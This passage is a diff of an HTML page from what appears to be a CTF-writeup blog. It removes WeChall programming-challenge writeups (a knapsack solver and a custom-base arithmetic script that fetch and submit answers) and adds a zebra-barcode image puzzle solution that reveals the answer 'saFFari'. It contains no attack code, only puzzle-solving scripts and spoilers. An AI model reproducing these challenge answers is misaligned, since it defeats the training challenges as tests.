-<li><strong>网格来源</strong>：<code>generate.php</code>，每次刷新不同，必须同一
-session 内抓取</li>
-<li><strong>提交方式</strong>：GET 到
-<code>index.php?solution=...&amp;cmd=Submit+Answer</code>，不需要
-CSRF</li>
-<li><strong>标准词库</strong>：<code>/usr/share/dict/words</code> 或
-dwyl/english-words 皆可，344K 单词 &gt;= 6 字符足够覆盖</li>
-<li><strong>Trie 剪枝</strong>是关键：不用 Trie 的话搜索量是
-<code>网格数 × 方向 × 最大路径长度</code>，用 Trie
-可以实时过滤无效前缀</li>
-<li><strong>答案 session-bound</strong>：每次网格不同，无固定答案</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-the-travelling-customer/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-the-travelling-customer/" class="post-title-link" itemprop="url">WeChall - The Travelling Customer</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-11 14:01:53" itemprop="dateCreated datePublished" datetime="2026-06-11T14:01:53+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 09:55:04" itemprop="dateModified" datetime="2026-09-15T09:55:04+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-the-travelling-customer/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-the-travelling-customer/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>The Travelling Customer (Coding, Training) by gizmore XKCD 287 风格
-bounded knapsack：5 轮，每轮 3 秒限时</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>页面给一个
-pricelist，要求选出指定数量的商品，使总价等于目标值，且每类商品不超过
-stock。需要连续解 5 轮，每轮 3 秒。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Endpoint: /en/challenge/training/programming/knapsaak/</span><br><span class="line">  problem.php     → 返回新问题</span><br><span class="line">  answer.php?answer=&lt;answer&gt;   → 提交答案（GET 方式）</span><br></pre></td></tr></table></figure>
-<p>题目参数（<code>problem.php</code> 返回的纯文本格式）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Items=50</span><br><span class="line">Sum=5001</span><br><span class="line">Stock=2</span><br><span class="line">Level=1</span><br><span class="line">Pizza=713</span><br><span class="line">Chips=590</span><br><span class="line">Eggs=523</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>这是 bounded knapsack（精确总价 + 精确件数 + 库存限制）。DFS + memo
-即可：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&#x27;https://www.wechall.net/en/challenge/training/programming/knapsaak&#x27;</span></span><br><span class="line">COOKIES = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;...&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_problem</span>(<span class="params">text</span>):</span><br><span class="line">    items = []</span><br><span class="line">    meta = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> text.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line: <span class="keyword">continue</span></span><br><span class="line">        k, v = line.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        k, v = k.strip(), v.strip()</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> (<span class="string">&#x27;Items&#x27;</span>, <span class="string">&#x27;Sum&#x27;</span>, <span class="string">&#x27;Stock&#x27;</span>, <span class="string">&#x27;Level&#x27;</span>):</span><br><span class="line">            meta[k] = <span class="built_in">int</span>(v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            items.append((k, <span class="built_in">int</span>(v)))   <span class="comment"># (name, price)</span></span><br><span class="line">    <span class="keyword">return</span> items, meta[<span class="string">&#x27;Items&#x27;</span>], meta[<span class="string">&#x27;Sum&#x27;</span>], meta[<span class="string">&#x27;Stock&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">items, need_count, need_sum, stock</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(items)</span><br><span class="line">    prices = [p <span class="keyword">for</span> _, p <span class="keyword">in</span> items]</span><br><span class="line">    names = [n <span class="keyword">for</span> n, _ <span class="keyword">in</span> items]</span><br><span class="line">    <span class="comment"># 按价格降序排列（剪枝效果更好）</span></span><br><span class="line">    order = <span class="built_in">sorted</span>(<span class="built_in">range</span>(n), key=<span class="keyword">lambda</span> i: -prices[i])</span><br><span class="line">    sp = [prices[i] <span class="keyword">for</span> i <span class="keyword">in</span> order]</span><br><span class="line"></span><br><span class="line">    memo = &#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">idx, ri, rs</span>):</span><br><span class="line">        <span class="keyword">if</span> ri == <span class="number">0</span> <span class="keyword">and</span> rs == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>] * (n - idx)</span><br><span class="line">        <span class="keyword">if</span> idx == n <span class="keyword">or</span> ri &lt; <span class="number">0</span> <span class="keyword">or</span> rs &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        key = (idx, ri, rs)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> memo:</span><br><span class="line">            <span class="keyword">return</span> memo[key]</span><br><span class="line">        <span class="comment"># 剪枝：剩余件数超出库存限制</span></span><br><span class="line">        <span class="keyword">if</span> ri &gt; stock * (n - idx):</span><br><span class="line">            memo[key] = <span class="literal">None</span>; <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 剪枝：剩余金额超出价格范围</span></span><br><span class="line">        min_p, max_p = <span class="built_in">min</span>(sp[idx:]), <span class="built_in">max</span>(sp[idx:])</span><br><span class="line">        <span class="keyword">if</span> rs &lt; ri * min_p <span class="keyword">or</span> rs &gt; ri * max_p:</span><br><span class="line">            memo[key] = <span class="literal">None</span>; <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        p = sp[idx]</span><br><span class="line">        <span class="keyword">for</span> qty <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(stock, ri, rs // p) + <span class="number">1</span>):</span><br><span class="line">            sub = dfs(idx + <span class="number">1</span>, ri - qty, rs - qty * p)</span><br><span class="line">            <span class="keyword">if</span> sub <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                memo[key] = [qty] + sub</span><br><span class="line">                <span class="keyword">return</span> memo[key]</span><br><span class="line">        memo[key] = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    qs = dfs(<span class="number">0</span>, need_count, need_sum)</span><br><span class="line">    <span class="keyword">if</span> qs <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 按原始顺序还原</span></span><br><span class="line">    quants = [<span class="number">0</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i, orig_idx <span class="keyword">in</span> <span class="built_in">enumerate</span>(order):</span><br><span class="line">        quants[orig_idx] = qs[i]</span><br><span class="line">    <span class="comment"># 拼接答案：qtyName...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(quants[i]) + names[i]</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> quants[i] &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.cookies.update(COOKIES)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> round_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    resp = s.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/problem.php&#x27;</span>)</span><br><span class="line">    items, cnt, target, stock = parse_problem(resp.text)</span><br><span class="line">    answer = solve(items, cnt, target, stock)</span><br><span class="line">    resp2 = s.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/answer.php&#x27;</span>, params=&#123;<span class="string">&#x27;answer&#x27;</span>: answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Round <span class="subst">&#123;round_num+<span class="number">1</span>&#125;</span>: <span class="subst">&#123;resp2.text.strip()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>Key Points:</p>
-<ul>
-<li><strong>GET 请求</strong>：抓题和提交都用 GET（不是 POST），不需要
-CSRF token</li>
-<li><strong>Cookie 复用</strong>：用 <code>requests.Session()</code>
-保持同一会话，5 轮连续</li>
-<li><strong>Answer 格式</strong>：数量直接拼接商品名，无分隔符。例如
-<code>2Pizza3Chips1Eggs</code></li>
-<li><strong>3 秒限时</strong>：每轮从抓题到提交必须在 3
-秒内完成，所以必须自动化</li>
-<li><strong>剪枝</strong>：价格排序 + 剩余范围检查，避免 DFS 爆炸</li>
-<li><strong>session-bound</strong>：每轮题目随机，答案不固定，无法直接复用</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-flow-over-astronomy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-flow-over-astronomy/" class="post-title-link" itemprop="url">WeChall - Flow Over Astronomy</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-11 13:59:36" itemprop="dateCreated datePublished" datetime="2026-06-11T13:59:36+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:12:09" itemprop="dateModified" datetime="2026-09-15T10:12:09+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-flow-over-astronomy/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-flow-over-astronomy/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Flow Over Astronomy (Coding, Math) by anto
-自定义进制大整数计算，必须在 3.1416 秒内提交结果</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>页面给出一个 charset、input base、solution base，以及一串用 input
-base 表示的等式。计算结果并以 solution base 表示提交。限时 3.1416
-秒。</p>
-<p>典型输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Charset: hpQiNnoSt2E_guqOHd5j]P3v01wKZFk&#125;&#123;c8L6fmbDsMlVU7T[IzRYeWxGaB4#@JC9yrAX</span><br><span class="line">Input Base: 52</span><br><span class="line">Solution Base: 25</span><br><span class="line"></span><br><span class="line">js6Q * zQwi * 0_Qm * pOZTc * RS_m * QthQf * ... + HjRq</span><br></pre></td></tr></table></figure>
-<ul>
-<li>Base N 使用 charset 的前 N 个字符做编码表</li>
-<li>等式结构：一长串乘法，末尾 <code>+</code> 一个数（全部是 input base
-编码）</li>
-</ul>
-<h3 id="solution">Solution</h3>
-<p>两个转换函数即可完成：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">from_base</span>(<span class="params">s, charset, base</span>):</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">    table = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(charset[:base])&#125;</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        value = value * base + table[ch]</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_base</span>(<span class="params">n, charset, base</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> charset[<span class="number">0</span>]</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        n, r = <span class="built_in">divmod</span>(n, base)</span><br><span class="line">        out.append(charset[r])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out))</span><br></pre></td></tr></table></figure>
-<p>完整解法（抓题、计算、提交）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, sys</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"></span><br><span class="line">CHALL_URL = <span class="string">&#x27;http://www.wechall.net/en/challenge/anto/FlowOverAstronomy/index.php&#x27;</span></span><br><span class="line">COOKIE = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>():</span><br><span class="line">    req = Request(CHALL_URL, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: COOKIE&#125;)</span><br><span class="line">    <span class="keyword">return</span> urlopen(req, timeout=<span class="number">10</span>).read().decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_base</span>(<span class="params">s, charset, base</span>):</span><br><span class="line">    table = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(charset[:base])&#125;</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s: v = v * base + table[ch]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_base</span>(<span class="params">n, charset, base</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> charset[<span class="number">0</span>]</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> n: n, r = <span class="built_in">divmod</span>(n, base); out.append(charset[r])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out))</span><br><span class="line"></span><br><span class="line">html = fetch()</span><br><span class="line"><span class="comment"># Parse parameters</span></span><br><span class="line">charset  = re.search(<span class="string">r&#x27;Charset:\s*(\S+)&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line">in_base  = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;Input Base:\s*(\d+)&#x27;</span>, html).group(<span class="number">1</span>))</span><br><span class="line">out_base = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;Solution Base:\s*(\d+)&#x27;</span>, html).group(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># Parse equation — split on operators, handle multi-line</span></span><br><span class="line">eq_match = re.search(<span class="string">r&#x27;Equation\s*\n(.*?)(?=\n&amp;copy;)&#x27;</span>, html, re.DOTALL)</span><br><span class="line">eq = eq_match.group(<span class="number">1</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Evaluate: split by + first, then *</span></span><br><span class="line">terms = eq.split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">product_terms = terms[<span class="number">0</span>].split(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">add_term = terms[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">result = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> product_terms:</span><br><span class="line">    result *= from_base(t.strip(), charset, in_base)</span><br><span class="line">result += from_base(add_term, charset, in_base)</span><br><span class="line"></span><br><span class="line">answer = to_base(result, charset, out_base)</span><br><span class="line"><span class="built_in">print</span>(answer)  <span class="comment"># 提交这个值</span></span><br></pre></td></tr></table></figure>
-<p>关键陷阱：</p>
-<ul>
-<li><strong>不用 float</strong>：数值巨大，全部用 Python big int</li>
-<li><strong>单 session 完成</strong>：charset 和 equation
-每次请求随机生成，不能手动分批</li>
-<li><strong>解析等式</strong>：注意多行；末尾的 <code>+ HjRq</code>
-是加法项，前面的 <code>*</code> 是乘法</li>
-<li><strong>HTML 解析</strong>：不要用 <code>.find()</code>
-切片，论坛反馈有人因此只错最后几位数字</li>
-<li><strong>限时 3.1416s</strong>：自动化脚本必须在同一 HTTP session
-内完成抓题→计算→提交</li>
-</ul>
-<p>答案 session-bound，每次不同，无法复用固定值。</p>
+<p>条码的黑色条纹只在斑马身上，没有延伸到上下边界（"escaped from its
+enclosure"），所以 <code>zbarimg</code> 等工具直接解码会失败。</p>
+<p>第一步，提取斑马条纹区域。用 Python
+垂直平均条纹区域，再按阈值二值化，模拟"补全"条纹的效果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;zebra.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取条纹密集区域 (y=46~258)</span></span><br><span class="line">region = arr[<span class="number">46</span>:<span class="number">258</span>, :, :<span class="number">3</span>].mean(axis=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每列判断：若超过 40% 像素是暗色，则该列算黑条</span></span><br><span class="line">col_dark = np.mean(region &lt; <span class="number">128</span>, axis=<span class="number">0</span>) &gt; <span class="number">0.4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成条码图像</span></span><br><span class="line">barcode = np.ones((<span class="number">100</span>, <span class="built_in">len</span>(col_dark) + <span class="number">40</span>), dtype=np.uint8) * <span class="number">255</span></span><br><span class="line">barcode[:, <span class="number">20</span>:-<span class="number">20</span>] = (<span class="number">1</span> - col_dark.astype(np.uint8)) * <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 放大以使解码器识别</span></span><br><span class="line">h, w = barcode.shape</span><br><span class="line">big = np.repeat(np.repeat(barcode, <span class="number">4</span>, axis=<span class="number">0</span>), <span class="number">2</span>, axis=<span class="number">1</span>)</span><br><span class="line">Image.fromarray(big).save(<span class="string">&#x27;zebra_fixed.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后用 <code>zbarimg</code> 解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ zbarimg -S*.<span class="built_in">enable</span> zebra_fixed.png</span><br><span class="line">QR-Code:The answer is saFFari</span><br></pre></td></tr></table></figure>
+<p>关键词即斑马跑到 Safari 上的那个双关词。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">saFFari</span></span>
 
       
     </div>
@@ -1585,7 +1638,7 @@ base 表示的等式。计算结果并以 solution base 表示提交。限时 3.
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/20/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><span class="page-number current">21</span><a class="page-number" href="/page/22/">22</a><span class="space">&hellip;</span><a class="page-number" href="/page/57/">57</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/22/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/20/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><span class="page-number current">21</span><a class="page-number" href="/page/22/">22</a><span class="space">&hellip;</span><a class="page-number" href="/page/47/">47</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/22/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
